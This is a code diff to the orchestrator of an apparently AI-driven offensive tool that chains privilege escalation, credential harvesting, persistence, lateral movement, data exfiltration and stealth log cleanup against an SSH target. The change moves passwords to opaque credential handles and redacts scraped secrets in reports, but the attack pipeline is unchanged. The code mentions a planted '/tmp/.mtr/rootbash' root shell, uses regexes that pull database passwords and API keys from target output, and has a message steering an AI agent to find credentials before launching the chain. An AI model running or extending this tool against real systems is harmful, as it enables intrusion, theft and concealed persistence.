@@ -18,8 +18,16 @@ except ImportError:
     def find_wordlist(cat): return ""
     def find_all_wordlists(cat): return []
 
-from typing import Optional
+from typing import Any, Callable, Optional, TypeVar, Union
 
+from core.credentials import (
+    CredentialRef,
+    credential_material_for_execution,
+    get_all_credential_refs_for_target,
+    get_best_credential_ref,
+    is_credential_handle,
+    resolve_credential_handle,
+)
 from core.killchain.cleanup import stealth_cleanup
 from core.killchain.exfil import data_exfil
 from core.killchain.exploitation import auto_exploit
@@ -30,6 +38,9 @@ from core.killchain.ssh_helpers import _ssh_connect
 from core.killchain.vuln_assess import vuln_assess
 
 logger = logging.getLogger("octopus.killchain.orchestrator")
+
+_ProviderResult = TypeVar("_ProviderResult")
+_CredentialInput = Union[CredentialRef, str]
 
 # ANSI Colors
 C_GREEN  = "\033[92m"
@@ -45,13 +56,92 @@ C_RESET  = "\033[0m"
 # PARAMIKO SSH HELPERS (shared across stages)
 
 
-def run_full_killchain(target: str, user: Optional[str] = None, password: Optional[str] = None,
-                       recon_data: str = "", port: int = 22) -> str:
+def _resolve_killchain_credential(
+    target: str,
+    user: Optional[Union[str, CredentialRef]],
+    password: Optional[_CredentialInput],
+    credential: Optional[_CredentialInput],
+) -> tuple[Optional[CredentialRef], str]:
+    """Resolve only an opaque SSH credential reference from compatibility inputs."""
+
+    selected = credential
+    username_hint = ""
+
+    if isinstance(user, CredentialRef) or is_credential_handle(user):
+        if selected is not None or password is not None:
+            return None, "[!] Ambiguous credential inputs are prohibited."
+        selected = user
+    else:
+        username_hint = str(user or "").strip()
+        if password is not None:
+            if selected is not None:
+                return None, "[!] Ambiguous credential inputs are prohibited."
+            if isinstance(password, CredentialRef) or is_credential_handle(password):
+                selected = password
+            elif str(password):
+                return None, "[!] Plaintext credential arguments are prohibited; use a credential:// handle."
+
+    if selected is None:
+        if username_hint:
+            return None, "[!] A credential:// handle is required with an SSH username."
+        return None, ""
+
+    resolved = resolve_credential_handle(selected)
+    if resolved is None:
+        return None, "[!] Unknown credential handle."
+    if resolved.service != "ssh" or resolved.target != target:
+        return None, "[!] Credential handle scope mismatch."
+    if username_hint and resolved.username != username_hint:
+        return None, "[!] Credential handle username mismatch."
+    return resolved, ""
+
+
+def _call_ssh_provider(
+    provider: Callable[..., _ProviderResult],
+    target: str,
+    credential: CredentialRef,
+    port: int,
+) -> _ProviderResult:
+    """Reveal a credential only for one immediate provider invocation."""
+
+    with credential_material_for_execution(credential) as material:
+        return provider(target, material.username, material.password, port)
+
+
+def _connect_with_credential(
+    target: str,
+    credential: CredentialRef,
+    port: int,
+) -> tuple[Any, str]:
+    """Reveal only while Paramiko establishes an authenticated session."""
+
+    with credential_material_for_execution(credential) as material:
+        return _ssh_connect(target, material.username, material.password, port)
+
+
+def run_full_killchain(
+    target: str,
+    user: Optional[Union[str, CredentialRef]] = None,
+    password: Optional[_CredentialInput] = None,
+    recon_data: str = "",
+    port: int = 22,
+    *,
+    credential: Optional[_CredentialInput] = None,
+) -> str:
     """
     Run the complete kill chain in sequence.
     Re-authenticates after privilege escalation before later stages.
     Order: Privesc → Harvest → Persist → Lateral → Exfil → Cleanup (LAST!)
     """
+    selected_credential, credential_error = _resolve_killchain_credential(
+        target,
+        user,
+        password,
+        credential,
+    )
+    if credential_error:
+        return credential_error
+
     print(f"\n  {C_RED}{'=' * 60}{C_RESET}")
     print(f"  {C_RED}  OCTOPUS FULL KILL CHAIN v8.1 -- {target}{C_RESET}")
     print(f"  {C_RED}{'=' * 60}{C_RESET}")
@@ -59,61 +149,69 @@ def run_full_killchain(target: str, user: Optional[str] = None, password: Option
     full_output = ""
 
     # Stages 3-9 require SSH credentials
-    if user and password:
+    if selected_credential is not None:
+        selected_user = selected_credential.username
         full_output += (
-            f"[*] Credentials available ({user}@{target}) -- skipping external vuln/exploit stages.\n"
+            f"[*] Credentials available ({selected_user}@{target}) -- skipping external vuln/exploit stages.\n"
             f"[*] Proceeding directly to post-exploitation stages 3-9.\n\n"
         )
         print(f"  {C_GREEN}[+] Credentials available -- skipping stages 1-2, going to post-exploit{C_RESET}")
 
         # Stage 3: Privilege Escalation
-        privesc_output = run_privesc(target, user, password, port)
+        privesc_output = _call_ssh_provider(
+            run_privesc,
+            target,
+            selected_credential,
+            port,
+        )
         full_output += privesc_output
 
         # Re-authenticate as root after privilege escalation.
-        eff_user = user
-        eff_pass = password
+        effective_credential = selected_credential
         if "ROOT ACCESS CONFIRMED" in privesc_output or "uid=0(root)" in privesc_output:
             re_authed = False
 
             # Method 1: Try root with known credentials from credential store
             try:
-                from tools import get_best_creds_for_target
-                root_creds = get_best_creds_for_target(target, "ssh")
-                root_pass = root_creds[1] if root_creds and root_creds[1] else password
-                test_client, _test_err = _ssh_connect(target, "root", root_pass, port)
-                if test_client:
-                    test_client.close()
-                    eff_user = "root"
-                    eff_pass = root_pass
-                    re_authed = True
-                    print(f"  {C_GREEN}[+] RE-AUTHENTICATED as root (credential store){C_RESET}")
-                    full_output += "\n[+] Re-authenticated as root for stages 4-9\n"
-            except Exception as e:
-                logger.debug(f"Root re-auth via credential store failed: {e}")
-
-            # Method 2: Try SSH key auth as root
-            if not re_authed:
-                try:
-                    test_client, _test_err = _ssh_connect(target, "root", "__KEY_AUTH__", port)
+                root_credential = get_best_credential_ref(
+                    target,
+                    "ssh",
+                    username="root",
+                    prefer_privileged=True,
+                )
+                if root_credential is not None:
+                    test_client, _test_err = _connect_with_credential(
+                        target,
+                        root_credential,
+                        port,
+                    )
                     if test_client:
                         test_client.close()
-                        eff_user = "root"
-                        eff_pass = "__KEY_AUTH__"
+                        effective_credential = root_credential
                         re_authed = True
-                        print(f"  {C_GREEN}[+] RE-AUTHENTICATED as root via SSH key{C_RESET}")
-                        full_output += "\n[+] Re-authenticated as root via SSH key for stages 4-9\n"
-                except Exception as _exc:
-                    logging.debug(f"Suppressed in orchestrator.py: {_exc}")
+                        print(f"  {C_GREEN}[+] RE-AUTHENTICATED as root (credential store){C_RESET}")
+                        full_output += "\n[+] Re-authenticated as root for stages 4-9\n"
+            except Exception as e:
+                logger.debug(
+                    "Root re-auth via credential store failed (%s)",
+                    type(e).__name__,
+                )
 
             if not re_authed:
-                print(f"  {C_YELLOW}[!] Root re-auth failed — continuing as {user} (rootbash may be available){C_RESET}")
-                full_output += f"\n[!] Root re-auth failed. Continuing as {user}.\n"
+                print(
+                    f"  {C_YELLOW}[!] Root re-auth failed — continuing as "
+                    f"{selected_user} (rootbash may be available){C_RESET}"
+                )
+                full_output += f"\n[!] Root re-auth failed. Continuing as {selected_user}.\n"
                 full_output += "[!] Note: /tmp/.mtr/rootbash may be available for local root commands.\n"
 
         # Stage 4: Credential Harvesting (from root = gets shadow, keys, etc.)
         try:
-            harvest_client, harvest_err = _ssh_connect(target, eff_user, eff_pass, port)
+            harvest_client, harvest_err = _connect_with_credential(
+                target,
+                effective_credential,
+                port,
+            )
             if harvest_client:
                 full_output += "\n" + _harvest_credentials(harvest_client, target)
                 harvest_client.close()
@@ -123,16 +221,36 @@ def run_full_killchain(target: str, user: Optional[str] = None, password: Option
             full_output += f"\n[-] Credential harvest error: {e}\n"
 
         # Stage 5: Persistence (from root = SSH keys, SUID, crontab)
-        full_output += "\n" + plant_persistence(target, eff_user, eff_pass, port)
+        full_output += "\n" + _call_ssh_provider(
+            plant_persistence,
+            target,
+            effective_credential,
+            port,
+        )
 
         # Stage 6: Lateral Movement
-        full_output += "\n" + lateral_move(target, eff_user, eff_pass, port)
+        full_output += "\n" + _call_ssh_provider(
+            lateral_move,
+            target,
+            effective_credential,
+            port,
+        )
 
         # Stage 7: Data Exfiltration (from root = full access)
-        full_output += "\n" + data_exfil(target, eff_user, eff_pass, port)
+        full_output += "\n" + _call_ssh_provider(
+            data_exfil,
+            target,
+            effective_credential,
+            port,
+        )
 
         # Cleanup must always remain the final stage.
-        full_output += "\n" + stealth_cleanup(target, eff_user, eff_pass, port)
+        full_output += "\n" + _call_ssh_provider(
+            stealth_cleanup,
+            target,
+            effective_credential,
+            port,
+        )
     else:
         # No creds — run full discovery pipeline
         # Stage 1: Vulnerability Assessment (always runs)
@@ -142,14 +260,23 @@ def run_full_killchain(target: str, user: Optional[str] = None, password: Option
         full_output += "\n" + auto_exploit(target, recon_data)
 
         full_output += "\n[!] No SSH credentials available -- stages 3-9 skipped.\n"
-        full_output += "AI: Find credentials first via bruteforce, then run [TOOL: killchain_full TARGET USER PASSWORD]\n"
+        full_output += (
+            "AI: Find credentials first, then run killchain_full with its "
+            "credential:// handle.\n"
+        )
 
     # Generate final report after all stages complete
-    if user and password:
+    if selected_credential is not None:
         loot_base = os.path.expanduser("~/OCTOPUS/loot")
         loot_dir = os.path.join(loot_base, target.replace('.', '_'))
         os.makedirs(loot_dir, exist_ok=True)
-        _generate_target_report(target, eff_user, loot_dir, [], full_output)
+        _generate_target_report(
+            target,
+            effective_credential.username,
+            loot_dir,
+            [],
+            full_output,
+        )
 
     return full_output
 
@@ -180,21 +307,35 @@ def _generate_target_report(host: str, user: str, loot_dir: str,
     # ── CREDENTIALS SECTION ────────────────────────────────────
     lines.append("[CREDENTIALS DISCOVERED]")
     lines.append("-" * 40)
-    # From credential cache
-    try:
-        from tools import get_all_known_creds_for_target
-        all_creds = get_all_known_creds_for_target(host)
-        for svc, cred_list in all_creds.items():
-            for u, p in cred_list:
-                lines.append(f"  [{svc}] {u}:{p}")
-    except ImportError:
-        pass
+    # From the reference-only credential cache. Secret references and plaintext
+    # are deliberately excluded from the report.
+    all_creds = get_all_credential_refs_for_target(host)
+    for service, credential_refs in all_creds.items():
+        for credential_ref in credential_refs:
+            lines.append(
+                f"  [{service}] {credential_ref.username} "
+                f"({credential_ref.auth_kind}; {credential_ref.handle})"
+            )
 
     # From output text
-    for m in _re.finditer(r'(?:DB_PASSWORD|DB_PASS|MYSQL_PASSWORD)\s*[=:]\s*[\'"]?([^\s\'"#;]{3,80})', full_output, _re.IGNORECASE):
-        lines.append(f"  [database] password: {m.group(1)}")
-    for m in _re.finditer(r'(?:API_KEY|SECRET_KEY|APP_SECRET|JWT_SECRET)\s*[=:]\s*[\'"]?([^\s\'"#;]{8,120})', full_output, _re.IGNORECASE):
-        lines.append(f"  [api_key] {m.group(1)[:60]}")
+    database_secrets = list(
+        _re.finditer(
+            r'(?:DB_PASSWORD|DB_PASS|MYSQL_PASSWORD)\s*[=:]\s*[\'"]?([^\s\'"#;]{3,80})',
+            full_output,
+            _re.IGNORECASE,
+        )
+    )
+    api_secrets = list(
+        _re.finditer(
+            r'(?:API_KEY|SECRET_KEY|APP_SECRET|JWT_SECRET)\s*[=:]\s*[\'"]?([^\s\'"#;]{8,120})',
+            full_output,
+            _re.IGNORECASE,
+        )
+    )
+    if database_secrets:
+        lines.append(f"  [database] {len(database_secrets)} secret value(s) observed; redacted")
+    if api_secrets:
+        lines.append(f"  [api_key] {len(api_secrets)} secret value(s) observed; redacted")
     lines.append("")
 
     # ── PRIVATE KEYS SECTION ──────────────────────────────────
@@ -264,11 +405,10 @@ def _generate_target_report(host: str, user: str, loot_dir: str,
 
 if __name__ == "__main__":
     target = input("Target IP: ").strip()
-    user = input("SSH User (or Enter to skip): ").strip()
-    pwd = input("SSH Password (or Enter to skip): ").strip()
+    credential_handle = input("SSH credential:// handle (or Enter to skip): ").strip()
 
-    if user and pwd:
-        print(run_full_killchain(target, user, pwd))
+    if credential_handle:
+        print(run_full_killchain(target, credential=credential_handle))
     else:
         print(vuln_assess(target))
         print(auto_exploit(target))
